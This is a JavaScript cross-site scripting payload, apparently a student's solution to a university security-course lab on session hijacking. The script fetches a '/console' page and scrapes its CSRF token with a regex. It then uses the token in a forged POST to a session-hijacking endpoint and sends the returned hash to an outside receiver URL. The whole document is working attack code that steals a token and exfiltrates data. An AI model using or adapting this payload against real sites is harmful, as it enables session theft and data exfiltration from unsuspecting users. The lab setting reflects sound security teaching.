<script>
// Step 1: Fetch the '/console' page and extract the CSRF token
fetch('/console').then(response => {
  if (!response.ok) {
    throw new Error('Network response was not ok');
  }
  return response.text();
  console.log(html);
}).then(html => {
  window.gotYou = true; // Indicating successful fetch
  // Extract the CSRF token using regex pattern matching
  const tokenPattern = /'X-CSRFToken': '([A-Za-z0-9+/=]+)'/;
  const tokenMatch = html.match(tokenPattern);
  const csrfToken = tokenMatch ? tokenMatch[1] : null;
  console.log(csrfToken);
  if (!csrfToken) {
    throw new Error('CSRF token not found');
  }

  // Step 2: Pass the extracted token and value to submitSessionHijacking
  // Assuming '#sessionHijack' input's value is set to 'gyadav35' elsewhere or here
  document.querySelector('#sessionHijack').value = 'gyadav35';
  submitSessionHijacking(csrfToken); // Modify the function to accept the token as an argument
}).catch(error => {
  console.error('Error fetching the /console or extracting CSRF:', error);
});

// Modified submitSessionHijacking to accept CSRF token
function submitSessionHijacking(csrfToken) {
  fetch('/session-hijacking/' + document.querySelector('#sessionHijack').value, {
    method: 'post',
    headers: {
      'X-CSRFToken': csrfToken
    }
  })
  .then(res => {
    if (!res.ok) {
      throw new Error('Network response was not ok');
    }
    return res.json();
  })
  .then(data => {
    const { hash } = data;
    document.querySelector('#sessionHijackingResult').innerHTML = hash;
    // Step 3: Send the hash value to the specified endpoint
    console.log(hash);
    sendHashToEndpoint(hash);
  })
  .catch(error => {
    console.error('Error in session hijacking attempt:', error);
  });
}

// Function to send hash to specified endpoint
function sendHashToEndpoint(hash) {
  fetch('https://cs6262.gtisc.gatech.edu/receive/gyadav35/699', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ hash: hash }),
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    console.log('Hash value successfully sent!');
    return response.json();
  })
  .catch(error => {
    console.error('Failed to send hash value:', error);
  });
}
</script>
